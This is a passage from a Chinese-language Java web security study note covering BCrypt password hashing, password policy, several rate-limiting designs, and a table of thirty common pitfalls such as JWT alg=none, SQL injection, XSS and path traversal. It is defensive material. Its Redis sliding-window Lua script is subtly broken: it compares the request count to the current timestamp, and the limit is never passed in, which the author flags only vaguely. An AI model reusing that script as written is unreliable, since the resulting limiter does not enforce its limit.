        return encoder.encode(rawPassword);      // $2a$12$LJ3m4ys3LzHX... （含算法、cost、盐、哈希）
    }

    /** 登录时：校验 */
    public boolean matches(String rawPassword, String encodedPassword) {
        return encoder.matches(rawPassword, encodedPassword);
    }

    /** ★ 判断是否需要升级哈希强度（用户登录时顺便升级） */
    public boolean upgradeEncoding(String encodedPassword) {
        return encoder.upgradeEncoding(encodedPassword);
    }
}

// 其他可选算法：
// - Argon2id（★ 2015 年密码哈希竞赛冠军，最推荐，Spring Security 5.3+ 支持 Argon2PasswordEncoder）
// - scrypt（SCryptPasswordEncoder）
// - PBKDF2（Pbkdf2PasswordEncoder，NIST 推荐，但抗 GPU 弱于 BCrypt/Argon2）
// ❌ 禁用：MD5、SHA-1、SHA-256（无盐）、DES

// 密码策略
// - 最小长度 8~12 位，要求包含大小写+数字+符号中的至少 3 类
// - 校验常见弱密码字典（123456、password、admin、手机号、生日）
// - 登录失败 5 次锁定 15 分钟 + 验证码
// - 支持密码历史检查（不能与前 5 次相同）
```

### 6.6 接口限流（防刷、防 CC）

```java
// ─── 方案 1：Guava RateLimiter（单机，令牌桶）───
private final RateLimiter rateLimiter = RateLimiter.create(100);   // 每秒 100 个令牌
public Result<?> handle() {
    if (!rateLimiter.tryAcquire(100, TimeUnit.MILLISECONDS)) {     // 等待最多 100ms
        return Result.failed(429, "请求过于频繁");
    }
    return doBusiness();
}

// ─── 方案 2：Redis + Lua（★ 分布式限流，原子性保证）───
@Component
@RequiredArgsConstructor
public class RedisRateLimiter {
    private final StringRedisTemplate redis;

    /** 固定窗口计数（简单，但有临界突刺问题） */
    public boolean allowFixedWindow(String key, int limit, Duration window) {
        String script = """
            local current = redis.call('INCR', KEYS[1])
            if current == 1 then
                redis.call('PEXPIRE', KEYS[1], ARGV[1])
            end
            return current <= tonumber(ARGV[2]) and 1 or 0
            """;
        Long result = redis.execute(new DefaultRedisScript<>(script, Long.class),
                List.of("rate:" + key),
                String.valueOf(window.toMillis()), String.valueOf(limit));
        return result != null && result == 1;
    }

    /** ★ 滑动窗口（ZSet，精确，无临界问题） */
    public boolean allowSlidingWindow(String key, int limit, Duration window) {
        long now = System.currentTimeMillis();
        String script = """
            redis.call('ZREMRANGEBYSCORE', KEYS[1], 0, ARGV[1])
            local count = redis.call('ZCARD', KEYS[1])
            if count < tonumber(ARGV[2]) then
                redis.call('ZADD', KEYS[1], ARGV[2], ARGV[3])
                redis.call('PEXPIRE', KEYS[1], ARGV[4])
                return 1
            end
            return 0
            """;
        Long result = redis.execute(new DefaultRedisScript<>(script, Long.class),
                List.of("rate:sw:" + key),
                String.valueOf(now - window.toMillis()),            // ARGV[1] 窗口起点
                String.valueOf(now),                                 // ARGV[2] 当前时间（score）
                UUID.randomUUID().toString(),                        // ARGV[3] member
                String.valueOf(window.toMillis()));                   // ARGV[4] 过期时间
        return result != null && result == 1;
    }
}
// ⚠️ 上面的 Lua 脚本 ARGV 索引需按实际调整，核心是「删过期 + 计数 + 判断 + 添加」原子执行

// ─── 方案 3：注解 + AOP（★ 业务友好的封装）───
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
public @interface RateLimit {
    String key() default "";                    // 限流键（支持 SpEL，如 "#userId"）
    int limit() default 100;                     // 阈值
    int window() default 60;                     // 时间窗口（秒）
    LimitType type() default LimitType.IP;       // 限流维度
    String message() default "请求过于频繁，请稍后重试";
}
public enum LimitType { IP, USER, GLOBAL, CUSTOM }

@Aspect
@Component
@RequiredArgsConstructor
@Slf4j
public class RateLimitAspect {
    private final RedisRateLimiter rateLimiter;

    @Around("@annotation(rateLimit)")
    public Object around(ProceedingJoinPoint pjp, RateLimit rateLimit) throws Throwable {
        String key = buildKey(pjp, rateLimit);
        if (!rateLimiter.allowFixedWindow(key, rateLimit.limit(),
                                          Duration.ofSeconds(rateLimit.window()))) {
            log.warn("触发限流：key={}, limit={}/{}s", key, rateLimit.limit(), rateLimit.window());
            throw new BusinessException(429, rateLimit.message());
        }
        return pjp.proceed();
    }

    private String buildKey(ProceedingJoinPoint pjp, RateLimit rateLimit) {
        MethodSignature sig = (MethodSignature) pjp.getSignature();
        String method = sig.getDeclaringTypeName() + "." + sig.getName();
        return switch (rateLimit.type()) {
            case IP -> method + ":ip:" + IpUtils.getClientIp();
            case USER -> method + ":user:" + UserContext.requireUserId();
            case GLOBAL -> method;
            case CUSTOM -> method + ":" + parseSpEL(rateLimit.key(), pjp);
        };
    }
}

// 使用
@RateLimit(limit = 5, window = 60, type = LimitType.IP, message = "验证码发送过于频繁")
@PostMapping("/sms/send")
public Result<Void> sendSms(@RequestParam String phone) { }

@RateLimit(limit = 100, window = 1, type = LimitType.USER)
@GetMapping("/orders")
public Result<List<Order>> listOrders() { }

// ─── 方案 4：Nginx 层限流（★ 最前置，保护后端）───
// nginx.conf
// limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;    # 每 IP 每秒 10 请求
// limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
// location /api/ {
//     limit_req zone=api_limit burst=20 nodelay;      # 允许突发 20 个，不排队
//     limit_conn conn_limit 10;                        # 单 IP 最多 10 个并发连接
//     limit_rate 1m;                                   # 响应限速
// }
// ─── 方案 5：Sentinel / Gateway（微服务级，见 [[后端/微服务/Sentinel限流熔断]]）───
```

## 7. 常见坑汇总

| # | 坑 | 现象 | 解决 |
| --- | --- | --- | --- |
| 1 | Payload 放敏感信息 | 任何人可解码看到 | ★ 只放非敏感的授权信息 |
| 2 | 密钥太短/硬编码 | 被暴力破解、泄漏到 Git | ≥32 字节随机密钥，从环境变量/KMS 读取 |
| 3 | 未强制校验 `alg` | **alg=none 或算法混淆攻击** | `requireSignatureAlgorithm("HS256")` |
| 4 | 未校验 iss/aud | 其他系统的 Token 能用 | `requireIssuer` + `requireAudience` |
| 5 | 用 `parse` 而非 `parseSignedClaims` | 接受无签名的 Token | 强制 `parseSignedClaims` |
| 6 | Access Token 有效期太长 | 泄漏后长期有效 | 15~30 分钟，配合 Refresh Token |
| 7 | 没有 Refresh 机制 | Token 过期就要重新登录 | 双 Token + 自动刷新 |
| 8 | 登出不拉黑 Access Token | 登出后 Token 仍可用到过期 | Redis 黑名单（TTL = 剩余有效期） |
| 9 | Refresh Token 存 localStorage | XSS 可窃取 | **HttpOnly + Secure + SameSite=Strict Cookie** |
| 10 | Refresh Token 不轮换 | 泄漏后可长期使用 | 每次刷新作废旧的（Rotation）+ 检测重放 |
| 11 | 权限变更不生效 | 用户被降权但旧 Token 仍有权 | Token 中带权限版本号，或缩短 TTL |
| 12 | 前端并发刷新 Token | 多个请求同时刷新，部分失败 | 加锁 + 请求队列（见前端代码） |
| 13 | Token 放 URL 参数 | 泄漏到日志/Referer/历史 | 用 Header；仅下载/WebSocket 场景例外 |
| 14 | 未设时钟偏差容忍 | 服务器时钟不同步导致验签失败 | `clockSkewSeconds(60)` |
| 15 | ThreadLocal 未清理 | 用户数据串号 | 拦截器 `afterCompletion` 中 clear |
| 16 | 只做前端权限控制 | 直接调 API 绕过 | ★ **服务端必须校验权限和资源归属** |
| 17 | 水平越权（按 ID 查不校验归属） | 用户 A 看到用户 B 的数据 | ★ 查询条件带 userId |
| 18 | XSS：`th:utext`/`v-html` 输出用户数据 | 存储型 XSS | 用转义版本 + Jsoup 白名单 + CSP |
| 19 | 只靠输入过滤防 XSS | 被各种编码绕过 | ★ 输出编码 + CSP（纵深防御） |
| 20 | Session 架构未开 CSRF 防护 | CSRF 转账 | SameSite + CSRF Token |
| 21 | JWT 存 Cookie 却关闭 CSRF 防护 | 仍有 CSRF 风险 | JWT 放 Header，或开启 CSRF |
| 22 | SQL 用 `${}` 拼接 | **SQL 注入** | ★ 一律 `#{}`；ORDER BY 用白名单 |
| 23 | 数据库账号权限过大 | 注入后可删表/拖库 | 最小权限（只给 DML） |
| 24 | 密码用 MD5/SHA | 彩虹表秒破 | **BCrypt / Argon2id** |
| 25 | 文件上传只校验扩展名 | 上传 webshell | 魔数校验 + 二次渲染 + 随机重命名 + 禁执行目录 |
| 26 | 下载接口未校验路径 | 目录遍历读 `/etc/passwd` | `normalize()` + `startsWith(baseDir)` |
| 27 | 未禁用 XML 外部实体 | XXE 读文件/SSRF | 禁用 DTD 和外部实体，优先用 JSON |
| 28 | 错误响应暴露栈信息 | 泄漏技术栈和代码结构 | 统一错误响应，详情只记日志 |
| 29 | 无限流的短信/登录接口 | 被刷爆（费用/账号锁定） | ★ 多维度限流（IP + 手机号 + 全局） |
| 30 | 密钥轮换未保留旧密钥 | 轮换瞬间所有 Token 失效 | kid + 多密钥共存，旧密钥保留至 Token 全过期 |

---

## 关联笔记

- 上一篇：[[后端/JavaWeb/Filter-Listener与会话管理]]
- 相关：[[后端/JavaWeb/Web基础与HTTP协议]]（Cookie/Session/CORS/HTTPS）、[[后端/Java基础/网络编程]]（TLS 编程）
- 框架整合：[[后端/SpringBoot/整合Web开发]]（Spring Security、全局异常）、[[后端/微服务/Gateway网关]]（网关统一鉴权）
- 缓存：[[后端/中间件/Redis在Java项目中的整合]]（Token 黑名单、限流）
- 数据库安全：[[后端/MyBatis/动态SQL与结果映射]]（`#{}` vs `${}`）
- 返回索引：[[后端/Java/Java学习笔记总索引]]
